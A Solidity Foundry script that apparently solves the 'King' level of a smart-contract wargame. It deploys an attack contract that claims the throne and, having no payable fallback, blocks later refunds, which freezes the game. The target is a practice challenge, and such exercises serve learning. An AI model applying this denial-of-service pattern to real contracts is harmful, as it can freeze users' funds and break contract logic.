// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {King} from "src/King.sol";
import {console} from "forge-std/console.sol";

contract Attack {
    constructor(King _kingInstance) payable {
        (bool success,) = address(_kingInstance).call{value: _kingInstance.prize()}("");
        console.log("Paying is:", success);
        console.log("contract address:", address(this));
        console.log("current king: ", _kingInstance._king());
    }
}

contract KingSolution is Script {
    King kingInstance = King(payable(0x3e1Dc808BB7401cb58b459043132b31961c1dE95));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack{value: kingInstance.prize()}(kingInstance);
        vm.stopBroadcast();
    }
}
